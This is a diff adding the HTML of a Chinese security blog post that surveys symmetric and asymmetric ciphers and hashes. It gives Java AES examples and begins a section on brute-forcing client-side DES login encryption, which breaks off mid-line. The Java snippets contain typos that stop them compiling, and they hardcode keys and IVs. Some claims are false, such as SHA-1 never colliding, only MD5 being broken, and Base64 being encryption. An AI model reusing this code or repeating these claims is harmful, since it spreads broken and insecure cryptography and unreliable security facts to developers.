@@ -1,0 +1,1119 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="0x01 前言加密算法分对称加密和非对称算法，其中对称加密算法的加密与解密密钥相同，非对称加密算法的加密密钥与解密密钥不同，此外，还有一类不需要密钥的散列算法。 常见的对称加密算法主要有DES、3DES、AES等，常见的非对称算法主要有RSA、DSA等，散列算法主要有SHA-1、MD5等。 对称算法又可分为两类。一次只对明文中的单个位（有时对字节）运算的算法称为序列算法或序列密码。另一类算法是对明">
+<meta name="keywords" content="加密与解密">
+<meta property="og:type" content="article">
+<meta property="og:title" content="加密方式">
+<meta property="og:url" content="https://wh0ale.github.io/2019/01/09/2019-1-9-加密与解密/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="0x01 前言加密算法分对称加密和非对称算法，其中对称加密算法的加密与解密密钥相同，非对称加密算法的加密密钥与解密密钥不同，此外，还有一类不需要密钥的散列算法。 常见的对称加密算法主要有DES、3DES、AES等，常见的非对称算法主要有RSA、DSA等，散列算法主要有SHA-1、MD5等。 对称算法又可分为两类。一次只对明文中的单个位（有时对字节）运算的算法称为序列算法或序列密码。另一类算法是对明">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz0flwi7w9j20fg042q3a.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz0gwxmzf4j20vc0bvjru.jpg">
+<meta property="og:image" content="https://camo.githubusercontent.com/487022ebfa1149750f2153a90da04c019328ce6b/68747470733a2f2f692e696d6775722e636f6d2f364453303467622e676966">
+<meta property="og:image" content="https://camo.githubusercontent.com/1eb5be1a9aad66e5c3a2d0236960e3f07af70e94/68747470733a2f2f692e696d6775722e636f6d2f6f637a6e4850612e676966">
+<meta property="og:image" content="https://camo.githubusercontent.com/311e0d4bb60a5f9f5c5d98a9ca95fc6d2e0c8c33/68747470733a2f2f692e696d6775722e636f6d2f4e4f4c6c5163792e676966">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz1avidhcfj20dw064q35.jpg">
+<meta property="og:image" content="https://camo.githubusercontent.com/f9f75b6fd8636c46352cea9dbdf3517f6de43899/68747470733a2f2f692e696d6775722e636f6d2f4579756b7868732e676966">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2uviam1mj21o60bqjzn.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2uvufc9bj21o80kedp2.jpg">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.318Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="加密方式">
+<meta name="twitter:description" content="0x01 前言加密算法分对称加密和非对称算法，其中对称加密算法的加密与解密密钥相同，非对称加密算法的加密密钥与解密密钥不同，此外，还有一类不需要密钥的散列算法。 常见的对称加密算法主要有DES、3DES、AES等，常见的非对称算法主要有RSA、DSA等，散列算法主要有SHA-1、MD5等。 对称算法又可分为两类。一次只对明文中的单个位（有时对字节）运算的算法称为序列算法或序列密码。另一类算法是对明">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz0flwi7w9j20fg042q3a.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/01/09/2019-1-9-加密与解密/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>加密方式 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/01/09/2019-1-9-加密与解密/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">加密方式
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-09 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-09T00:00:00+08:00">2019-01-09</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">12k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">11 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>加密算法分对称加密和非对称算法，其中对称加密算法的加密与解密密钥相同，非对称加密算法的加密密钥与解密密钥不同，此外，还有一类不需要密钥的散列算法。</p>
+<p>常见的对称加密算法主要有DES、3DES、AES等，常见的非对称算法主要有RSA、DSA等，散列算法主要有SHA-1、MD5等。</p>
+<p>对称算法又可分为两类。一次只对明文中的单个位（有时对字节）运算的算法称为序列算法或序列密码。另一类算法是对明文的一组位进行运算（即运算之前将明文分为若干组，然后分别对每一组进行运算，这些位组称为分组），相应的算法称为分组算法或分组密码。</p>
+<p><strong>DES加密算法</strong></p>
+<p>​       DES加密算法是一种分组密码，以64位为分组对数据加密，它的密钥长度是56位，加密解密用同一算法。DES加密算法是对密钥进行保密，而公开算法，包括加密和解密算法。这样，只有掌握了和发送方相同密钥的人才能解读由DES加密算法加密的密文数据。因此，破译DES加密算法实际上就是搜索密钥的编码。对于56位长度的密钥来说，如果用穷举法来进行搜索的话，其运算次数为2的56次方。</p>
+<p>DES算法的入口参数有三个：Key、Data、Mode。</p>
+<p>　　其中Key为8个字节共64位，是<strong>DES算法的工作密钥</strong>；</p>
+<p>　　Data也为8个字节64位，是要<strong>被加密或被解密的数据</strong>；</p>
+<p>　　Mode为DES的工作方式，有两种：<strong>加密或解密</strong>。</p>
+<p>　　<strong>DES算法是这样工作的：</strong></p>
+<p>　　如Mode为加密，则用Key 去把数据Data进行加密， 生成Data的密码形式（64位）作为DES的输出结果；</p>
+<p>　　如Mode为解密，则用Key去把密码形式的数据Data解密，还原为Data的明码形式（64位）作为DES的输出结果。</p>
+<p>　　在通信网络的两端，双方约定一致的Key，在通信的源点用Key对核心数据进行DES加密，然后以密码形式在公共通信网（如电话网）中传输到通信网络的终点，数据到达目的地后，用同样的Key对密码数据进行解密，便再现了明码形式的核心数据。这样，便保证了核心数据（如PIN、MAC等）在公共通信网中传输的安全性和可靠性。</p>
+<p>　　通过定期在通信网络的源端和目的端同时改用新的Key，便能更进一步提高数据的保密性，这正是现在金融交易网络的流行做法。</p>
+<p><strong>3DES（Triple DES）</strong></p>
+<p>​    3DES是DES加密算法的一种模式，它使用<strong>3条64位的密钥对数据进行三次加密</strong>。数据加密标准（DES）是美国的一种由来已久的加密标准，它使用对称密钥加密法。</p>
+<p>　　3DES（即Triple DES）是DES向AES过渡的加密算法（1999年，NIST将3-DES指定为过渡的加密标准），是DES的一个更安全的变形。它以DES为基本模块，通过组合分组方法设计出分组加密算法。</p>
+<p>　　设Ek()和Dk()代表DES算法的加密和解密过程，K代表DES算法使用的密钥，P代表明文，C代表密表，这样，</p>
+<p>　　3DES加密过程为：<code>C=Ek3(Dk2(Ek1(P)))</code></p>
+<p>　　3DES解密过程为：<code>P=Dk1((EK2(Dk3(C)))</code></p>
+<p>　　K1、K2、K3决定了算法的安全性，若三个密钥互不相同，本质上就相当于用一个长为168位的密钥进行加密。多年来，它在对付强力攻击时是比较安全的。若数据对安全性要求不那么高，K1可以等于K3。在这种情况下，密钥的有效长度为112位。</p>
+<p><strong>AES加密算法</strong></p>
+<p>​      AES算法基于排列和置换运算。排列是对数据重新进行安排，置换是将一个数据单元替换为另一个。</p>
+<p>　　AES使用几种不同的方法来执行排列和置换运算。AES是一个迭代的、对称密钥分组的密码，它可以使用<strong>128、192和256位密钥</strong>，并且用128位（16字节）分组加密和解密数据。</p>
+<p>　　与公共密钥加密使用密钥对不同，对称密钥密码使用相同的密钥加密和解密数据。通过分组密码返回的加密数据的位数与输入数据相同。迭代加密使用一个循环结构，在该循环中重复置换和替换输入数据。</p>
+<p><strong>RSA加密算法</strong></p>
+<p>​       RSA加密算法是目前最有影响力的公钥加密算法，并且被普遍认为是目前最优秀的公钥方案之一。RSA是第一个能同时用于加密和数宇签名的算法，它能够抵抗到目前为止已知的所有密码攻击，已被ISO推荐为公钥数据加密标准。RSA加密算法基于一个十分简单的数论事实：将两个大素数相乘十分容易，但想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。</p>
+<p><strong>DSA加密算法</strong></p>
+<p>​       DSA是基于整数有限域离散对数难题的，DSA的一个重要特点是两个素数公开，这样，当使用别人的p和q时，即使不知道私钥，你也能确认它们是否是随机产生的，还是作了手脚。这一点，RSA算法做不到。</p>
+<p>​       相比于RSA，DSA 只用于签名，而 RSA 可用于签名和加密。</p>
+<p><strong>Base64加密算法</strong></p>
+<p>​       Base64加密算法是网络上最常见的用于传输8bit字节代码的编码方式之一，Base64编码可用于在HTTP环境下传递较长的标识信息。</p>
+<p><strong>MD5加密算法</strong></p>
+<p>​       MD5为计算机安全领域广泛使用的一种散列函数，用以提供消息的完整性保护。</p>
+<p>​       MD5被广泛用于各种软件的密码认证和钥匙识别上。MD5用的是哈希函数，它的典型应用是对一段信息产生信息摘要，以防止被篡改。MD5的典型应用是对一段Message产生fingerprin指纹，以防止被“篡改”。如果再有—个第三方的认证机构，用MD5还可以防止文件作者的“抵赖”，这就是所谓的数字签名应用。MD5还广泛用于操作系统的登陆认证上，如UNIX、各类BSD系统登录密码、数字签名等诸多方。</p>
+<p>网上有在线破解：</p>
+<p>网上md5的破解主要都是采用暴力生成各种字符串组合然后进行hash，很多用户的密码都不够复杂，所以很容易被这种方式生成出来。防范这种方式的办法一个是随机salt，只要salt够随机也够长，就会带来巨大的状态空间，极大降低被暴力生成到的可能。另一个办法是生成hash的速度够慢，比如迭代1000次，这样就大大降低了暴力运算的速度。</p>
+<p>还有种破解就是采用彩虹表和字典：通过数据库把常见字符转的MD5存储起来为彩虹表，然后直接反查。有两种方法得到字典，一种是日常搜集的用做密码的字符串表，另一种是用排列组合方法生成的，先用MD5程序计算出这些字典项的MD5值，然后再用目标的MD5值在这个字典中检索。</p>
+<p>比如我通过大量例子发现某密文中A对应C，然后我会记在数据字典中，下次直接用C代替A，看上去好像了破解了，实则并没有破解，只是找到了规律适应这种密文而已。</p>
+<p><strong>SHA1加密算法</strong></p>
+<p>​       SHA1是和MD5一样流行的消息摘要算法。SHA加密算法模仿MD4加密算法。</p>
+<p>​       SHA1主要适用于数字签名标准里面定义的数字签名算法。对于长度小于2“64位的消息，SHA1会产生一个160位的消息摘要。当接收到消息的时候，这个消息摘要可以用来验证数据的完整性。在传输的过程中，数据很可能会发生变化，那么这时候就会产生不同的消息摘要。SHA1不可以从消息摘要中复原信息，而且两个不同的消息不会产生同样的消息摘要。这样，SHA1就可以验证数据的完整性，所以说SHA1是为了保证文件完整性的技术。</p>
+<p>​       SHA1是一种比MD5的安全性强的算法，理论上，凡是采取“消息摘要”方式的数字验证算法都是有“碰撞”的——也就是两个不同的东西算出的消息摘要相同，互通作弊图就是如此。但是安全性高的算法要找到指定数据的“碰撞”很困难，而利用公式来计算“碰撞”就更困难一目前为止通用安全算法中仅有MD5被破解。</p>
+<p><strong>各种加密算法比较如下：</strong></p>
+<p><strong>对称加密算法(加解密密钥相同)</strong></p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>密钥长度</th>
+<th>运算速度</th>
+<th>安全性</th>
+<th>资源消耗</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DES</td>
+<td>56位</td>
+<td>较快</td>
+<td>低</td>
+<td>中</td>
+</tr>
+<tr>
+<td>3DES</td>
+<td>112位或168位</td>
+<td>慢</td>
+<td>中</td>
+<td>高</td>
+</tr>
+<tr>
+<td>AES</td>
+<td>128、192、256位</td>
+<td>快</td>
+<td>高</td>
+<td>低</td>
+</tr>
+</tbody></table>
+<p><strong>非对称算法(加密密钥和解密密钥不同)</strong></p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>成熟度</th>
+<th>安全性(取决于密钥长度)</th>
+<th>运算速度</th>
+<th>资源消耗</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>RSA</td>
+<td>高</td>
+<td>高</td>
+<td>慢</td>
+<td>高</td>
+</tr>
+<tr>
+<td>DSA</td>
+<td>高</td>
+<td>高</td>
+<td>快</td>
+<td>只能用于数字签名</td>
+</tr>
+</tbody></table>
+<p><strong>散列算法比较</strong></p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>安全性</th>
+<th>速度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SHA-1</td>
+<td>高</td>
+<td>慢</td>
+</tr>
+<tr>
+<td>MD5</td>
+<td>中</td>
+<td>快</td>
+</tr>
+</tbody></table>
+<p><strong>对称与非对称算法比较</strong></p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>密钥管理</th>
+<th>安全性</th>
+<th>速度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>对称算法</td>
+<td>比较难,不适合互联网,一般用于内部系统</td>
+<td>中</td>
+<td>快好几个数量级(软件加解密速度至少快100倍,每秒可以加解密数M比特数据),适合大数据量的加解密处理</td>
+</tr>
+<tr>
+<td>非对称算法</td>
+<td>密钥容易管理</td>
+<td>高</td>
+<td>慢,适合小数据量加解密或数据签名</td>
+</tr>
+</tbody></table>
+<p>目前主流的加密方式有：（对称加密）AES、DES        （非对称加密）RSA、DSA</p>
+<p>调用AES/DES加密算法包最精要的就是下面两句话：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cipher cipher = Cipher.getInstance(&quot;DES/CBC/PKCS5Padding&quot;);</span><br><span class="line">cipher.init(Cipher.ENCRYPT_MODE, key, zeroIv);</span><br></pre></td></tr></table></figure>
+
+<p>CBC是工作模式，DES一共有电子密码本模式（<a href="http://www.hudong.com/wiki/ECB" target="_blank" rel="noopener">ECB</a>）、加密分组链接模式（<a href="http://www.hudong.com/wiki/CBC" target="_blank" rel="noopener">CBC</a>）、加密反馈模式（<a href="http://www.hudong.com/wiki/CFB" target="_blank" rel="noopener">CFB</a>）和输</p>
+<p>出反馈模式（<a href="http://write.blog.csdn.net/postedit" target="_blank" rel="noopener">OFB</a>）四种模式，常见DES/ECB/NOPadding ，DES/CBC/PKCS5Padding.ECB只需要key即可，CBC</p>
+<p>模式需要设置key和iv 都是8位</p>
+<p>PKCS5Padding是填充模式，还有其它的填充模式：</p>
+<p>然后，cipher.init（)一共有三个参数：<code>Cipher.ENCRYPT_MODE</code>, <code>key</code>, <code>zeroIv</code>，zeroIv就是初始化向量。</p>
+<p><font color="#dd0000">工作模式、填充模式、初始化向量</font> 这三种因素一个都不能少。否则，如果你不指定的话，那么就要程序就要调用默认实现。</p>
+<p>ECB只需要key即可，CBC模式需要设置key和iv 都是8位</p>
+<p><a href="http://ctf.ssleye.com/cdes.html" target="_blank" rel="noopener">http://ctf.ssleye.com/cdes.html</a></p>
+<p><a href="http://tool.chacuo.net/cryptdes" target="_blank" rel="noopener">http://tool.chacuo.net/cryptdes</a></p>
+<p><a href="https://www.sojson.com/encrypt/" target="_blank" rel="noopener">https://www.sojson.com/encrypt/</a></p>
+<p><strong>加密：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">加密方式： AES128(CBC/PKCS5Padding) + Base64, 私钥：lianghuilonglong,要加密的字符串abcdefg</span><br><span class="line"></span><br><span class="line">public String encrypt()&#123;</span><br><span class="line"></span><br><span class="line">　　String text = &quot;abcdefg&quot;;   //要加密的字符串</span><br><span class="line"></span><br><span class="line">　　String key = &quot;lianghuilonglong&quot;;　 //私钥   AES固定格式为128/192/256 bits.即：16/24/32bytes。DES固定格式为128bits，即8bytes。</span><br><span class="line"></span><br><span class="line">　　String iv   = &quot;aabbccddeeffgghh&quot;;　　//初始化向量参数，AES 为16bytes. DES 为8bytes.</span><br><span class="line"></span><br><span class="line">　　Key keySpec = new SecretKeySpec(key.getBytes(), &quot;AES&quot;);    //两个参数，第一个为私钥字节数组， 第二个为加密方式 AES或者DES</span><br><span class="line"></span><br><span class="line">　　IvParameterSpec ivSpec = new IvParameterSpec(iv.getBytes);</span><br><span class="line"></span><br><span class="line">　　Cipher cipher = Cipher.getIntance(&quot;AES/CBC/PKCS5Padding&quot;);　  //实例化加密类，参数为加密方式，要写全</span><br><span class="line"></span><br><span class="line">　　cipher.init(Cipher.ENCRYPT_MODE,  keySpec, ivSpec);　　           //初始化，此方法可以采用三种方式，按服务器要求来添加。（1）无第三个参数（2）第三个参数为SecureRandom random = new SecureRandom();中random对象，随机数。(AES不可采用这种方法)（3）采用此代码中的IVParameterSpec</span><br><span class="line"></span><br><span class="line">　　//cipher.init(Cipher.ENCRYPT_MODE, keySpec);</span><br><span class="line"></span><br><span class="line">　　//SecureRandom random = new SecureRandom();</span><br><span class="line"></span><br><span class="line">　　//cipher.init(Cipher.ENCRYPT_MODE, keySpec, random);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">　　byte [] b = cipher.doFinal(text.getBytes());　                   //加密操作,返回加密后的字节数组，然后需要编码。主要编解码方式有Base64, HEX, UUE, 7bit等等。此处看服务器需要什么编码方式</span><br><span class="line"></span><br><span class="line">　　String ret = Base64.encode(b);                                       //Base64、HEX等编解码</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>解密：</strong></p>
+<p>逻辑： 将服务器返回的加密字符串，先用Base64、HEX等解码成byte[]，再用加密时相同的加密方式及key进行解密。加密与解密代码几乎相同。唯一区别为在Cipher类init时，工作模式为Cipher.DECRYPT_MODE。代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">加密方式： AES128(CBC/PKCS5Padding) + Base64, 私钥：lianghuilonglong</span><br><span class="line"></span><br><span class="line">public String deCiphering()&#123;</span><br><span class="line"></span><br><span class="line">　　String keySpec = &quot;lianghuilonglong&quot;;</span><br><span class="line"></span><br><span class="line">　　String textDeCipher = &quot;UstyI8JoQOty8egSMFQfig==&quot;;   //从服务器返回的加密字符串，需要解密的字符串</span><br><span class="line"></span><br><span class="line">　　byte [] byte = Base64.decode(textDeCipher);　　         //先用Base64解码</span><br><span class="line"></span><br><span class="line">　　IvParaterSpec ivSpec = new IvParaterSpec(&quot;abcdefghabcdefgh&quot;.getBytes());</span><br><span class="line"></span><br><span class="line">　　Key key = new SecretKeySpec(keySpec.getBytes(), &quot;AES&quot;);</span><br><span class="line"></span><br><span class="line">　　Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5Padding&quot;);</span><br><span class="line"></span><br><span class="line">　　cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);               //与加密时不同MODE:Cipher.DECRYPT_MODE</span><br><span class="line"></span><br><span class="line">　　byte [] ret = cipher.doFinal(byte);</span><br><span class="line"></span><br><span class="line">　　return new String(ret, &quot;utf-8&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-jsDES的爆破"><a href="#0x02-jsDES的爆破" class="headerlink" title="0x02 jsDES的爆破"></a>0x02 jsDES的爆破</h1><p><strong>DES加密</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">functionencryptByDES(message, key) &#123;</span><br><span class="line">  <span class="keyword">var</span> keyHex = CryptoJS.enc.Utf8.parse(key);</span><br><span class="line">  <span class="keyword">var</span> encrypted = CryptoJS.DES.encrypt(message, keyHex, &#123;</span><br><span class="line">      mode: CryptoJS.mode.ECB,</span><br><span class="line">      padding: CryptoJS.pad.Pkcs7</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> encrypted.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>key藏于html中</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">form_login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">var</span> username=<span class="built_in">document</span>.getElementById(<span class="string">"username"</span>).value;</span><br><span class="line">		<span class="keyword">var</span> password=<span class="built_in">document</span>.getElementById(<span class="string">"password"</span>).value;</span><br><span class="line">		<span class="keyword">var</span> pwd_key= <span class="string">'&#123;"username":"'</span>+username+<span class="string">'","password":"'</span>+password+<span class="string">'"&#125;'</span>;</span><br><span class="line">		alert(pwd_key);</span><br><span class="line">		<span class="keyword">var</span> post_key= encryptByDES(pwd_key,<span 